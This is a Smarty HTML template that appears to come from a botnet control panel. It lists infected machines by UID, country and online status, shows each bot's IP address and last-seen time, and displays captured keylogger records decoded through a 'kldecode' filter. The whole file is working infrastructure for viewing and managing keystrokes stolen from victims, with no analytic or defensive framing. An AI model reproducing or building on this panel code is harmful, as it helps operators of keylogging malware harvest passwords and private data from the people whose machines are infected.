{if $item ne true}

<div class="top_menu">

<div class="top_menu_left" style="font-weight:bold">
<div style="line-height: 5px">{$lang.prog}: {$prog->name}</div>
<div style="line-height: 35px">{$lang.hashprog}: {$prog->hash}</div>
</div>

<div class="top_menu_right">
<a href="/bots/index.html" onclick="return get_hax({ldelim}url:'/keylog/index.html?ajax=1&y={$Cur.y}',method:'get',id:'content'{rdelim});">{$lang.nksp}</a>&nbsp;
{if $Cur.y eq '1'}<a href="#" onclick="get_hax({ldelim}url: '/keylog/index.html?ajax=1'{rdelim});" style="background-color:#0A8200">{$lang.trashext}</a>{/if}
</div>

</div>
<hr />
<br />
<form name="groups" id="groups">
<div style="font-size:10px; position:relative" align="center">
<div style="position:absolute; left: 0px; top:10px">{$lang.maxstr}: {$_SESSION.user->config.cp.keylogp}</div>
&nbsp;{$pages}&nbsp;
<div style="position:absolute; right: 0px; top:10px">{$lang.vsego}: {$counts}</div>
</div>
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc; text-align: center"">
{if $Cur.y ne '1'}
<tr class="bgp3">
<td style="width:35%;">{$lang.uid}</td>
<td style="width:10%">{$lang.bot}</td>
<td style="width:25%;">{$lang.comm}</td>
<td style="width:10%;">{$lang.zapis}</td>
<td style="width:20%;">{$lang.datad}</td>
<td style="width: 1px;">&nbsp;</td>
</tr>
{foreach from=$list item=item key=key name=list}
{if $smarty.foreach.list.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr id="tr_{$item->hash}_{$item->prefix}{$item->uid}" class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF; cursor:pointer;" onclick="var uid = '{$item->prefix}{$item->uid}';">
<th onclick="keylog_item(this, '{$Cur.y}');">{$item->prefix}{$item->uid}</th>
<th onclick="get_bot_window(this);" {if $online[$item->prefix][$item->uid]}style="background-color:#0F0"{/if}><a>{$country[$item->country]}</a></th>
<th style="{if $item->comment|strpos:"!" ne 0}color:#F00{/if}" onclick="return false;" id="cg_{$item->id}" ondblclick="edit_comment_kl(this, 'groups', '9');">{$item->comment}</th>
<th onclick="keylog_item(this, '{$Cur.y}');">{$item->count}</th>
<th onclick="keylog_item(this, '{$Cur.y}');">{$item->post_date}</th>
<th><a href="#" onclick="if(confirm('{$lang.delyt}')){ldelim}item_del('{$item->id}', '{$prog->hash}');{rdelim}"><img src="/images/delete.png" alt="{$lang.adel}" /></a></th>
</tr>
{/foreach}
{else}
<tr class="bgp3">
<td style="width:35%;">{$lang.uid}</td>
<td style="width:10%">{$lang.bot}</td>
<td style="width:25%;">{$lang.comm}</td>
<td style="width:10%;">{$lang.zapis}</td>
<td style="width:20%;">{$lang.datad}</td>
</tr>
{foreach from=$list item=item key=key name=list}
{if $smarty.foreach.list.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr id="tr_{$item->hash}_{$item->prefix}{$item->uid}" class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF; cursor:pointer;" onclick="var uid = '{$item->prefix}{$item->uid}';">
<th onclick="keylog_item(this, '{$Cur.y}');">{$item->prefix}{$item->uid}</th>
<th onclick="get_bot_window(this);" {if $online[$item->prefix][$item->uid]}style="background-color:#0F0"{/if}><a>{$lang.show}</a></th>
<th style="{if $item->comment|strpos:"!" ne 0}color:#F00{/if}" onclick="return false;" id="cg_{$item->id}" ondblclick="edit_comment_kl(this, 'groups', '9');">{$item->comment}</th>
<th onclick="keylog_item(this, '{$Cur.y}');">{$item->count}</th>
<th onclick="keylog_item(this, '{$Cur.y}');">{$item->post_date}</th>
</tr>
{/foreach}
{/if}
</table>
</form>
<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>
{else}
<style>textarea {ldelim}width:100%; height: 120px; resize: none; border: 1px solid #000;{rdelim}</style>
<div class="top_menu">

<div class="top_menu_left" style="font-weight:bold">
<div style="line-height: 5px">{$lang.prog}: {$prog->name}</div>
<div style="line-height: 35px">{$lang.hashprog}: {$prog->hash}</div>
</div>

<div class="top_menu_right">
<a href="/bots/index.html" onclick="return get_hax({ldelim}url:'/keylog/hash-{$prog->id}.html?ajax=1&y={$Cur.y}',method:'get',id:'content'{rdelim});">{$lang.nsz}</a>&nbsp;
{if $Cur.y eq '1'}<a href="#" onclick="get_hax({ldelim}url: '/keylog/index.html?ajax=1'{rdelim});" style="background-color:#0A8200">{$lang.trashext}</a>{/if}
</div>

</div>
<hr />
<br />
<form name="groups" id="groups">
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #000; text-align: center"">
<tr class="bgp2">
<th style="width: 20%">{$lang.bot}</th>
<th style="cursor: pointer;" onclick="get_bot_window_u('{$bot->prefix}{$bot->uid}');"><a href="#">{$bot->prefix}{$bot->uid}</a></th>
</tr>
<tr class="bgp1">
<th>{$lang.ipcou}</th>
<th>{$bot->ip} ({$bot->country})</th>
</tr>
<tr class="bgp2">
<th>{$lang.posledot}</th>
<th>{$bot->last_date|ts2str}</th>
</tr>
<tr class="bgp1">
<th>{$lang.comm}</th>
<th style="cursor: pointer; {if $comment|strpos:"!" ne 0}color:#F00{/if}" onclick="return false;" id="cg_{$list.0->id}" ondblclick="edit_comment_kl(this, 'groups', '9');">{$comment}</th>
</tr>
</table>
</form>
<br /><hr /><br />
{foreach from=$list item=item key=key name=list}
{if $smarty.foreach.list.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc; text-align: center"">
<tr class="bgp1">
<th>{$lang.log}</th>
<th><textarea readonly="readonly" rows="1" cols="1">{$item->data|kldecode}</textarea></th>
</tr>
<tr class="bgp2">
<th>{$lang.hashz}</th>
<th>{$item->shash}</th>
</tr>
<tr class="bgp1">
<th>{$lang.datad}</th>
<th>{$item->post_date}</th>
</tr>
</table>
<br /><hr /><br />
{/foreach}

{/if}